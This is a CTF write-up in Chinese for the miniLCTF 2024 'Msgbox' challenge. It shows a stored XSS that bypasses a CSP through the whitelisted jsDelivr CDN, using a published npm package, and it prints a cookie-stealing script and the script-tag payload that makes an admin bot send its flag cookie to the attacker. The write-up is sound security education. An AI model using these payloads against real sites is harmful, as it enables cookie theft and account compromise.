# miniLCTF 2024 Msgbox Writeup

## 题目简述

站点允许用户互发消息，`/report` 会启动管理员浏览器：管理员先获得一个名为 `flag` 的 Cookie，登录后打开收件箱第一条消息。消息正文以 Jinja `safe` 渲染，页面 CSP 允许自身、带随机 nonce 的脚本以及 `cdn.jsdelivr.net`。目标是构造存储型 XSS，把非 HttpOnly 的 flag Cookie 发回攻击者收件箱。

## 解题过程

### 确认注入点和 CSP 边界

`read.html` 中有：

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'nonce-{{ nonce }}' cdn.jsdelivr.net;">
<p id="content">{{ message.content | safe }}</p>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
```

正文未转义，能插入任意 HTML。随机 nonce 阻止普通内联脚本，但 `cdn.jsdelivr.net` 被列入脚本源白名单，所以可以把攻击脚本发布为公开 npm 包，再通过 jsDelivr 加载。页面随后调用 `marked.parse(content.textContent)` 不会消除服务器解析阶段已经创建并加载的外部 `<script>`。

管理员的认证 Cookie `auth` 是 HttpOnly；flag Cookie 在 `robot.py` 中用 Selenium `add_cookie` 创建，未设置 HttpOnly，因此 `document.cookie` 可以读取 flag，但不会泄露管理员 JWT。

### 让管理员把 Cookie 发回消息系统

攻击脚本 `steal.js`：

```javascript
const body = new URLSearchParams({
  header: "admin cookie",
  listener: "attacker",
  content: document.cookie,
});

fetch("/send", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body,
});
```

发布例如 `msgbox-steal@1.0.0` 后，给 `admin` 发送正文：

```html
<script src="https://cdn.jsdelivr.net/npm/msgbox-steal@1.0.0/steal.js"></script>
```

由于机器人只打开管理员收件箱第一条消息，应在触发 `/report` 前最后发送恶意消息。访问 `/report` 后，管理员浏览器携带 flag Cookie 执行外部脚本，并以管理员身份向 `attacker` 发信；回到攻击者收件箱即可看到 `flag=...`。

## 方法总结

CSP 不是“有就安全”，白名单中的公共 CDN 若允许攻击者自行发布内容，就等价于给攻击者脚本执行权。完整审计应同时检查 HTML 转义、nonce、允许域的内容控制权以及敏感 Cookie 属性。本题还提醒要理解机器人访问顺序，确保存储型载荷成为第一条消息。
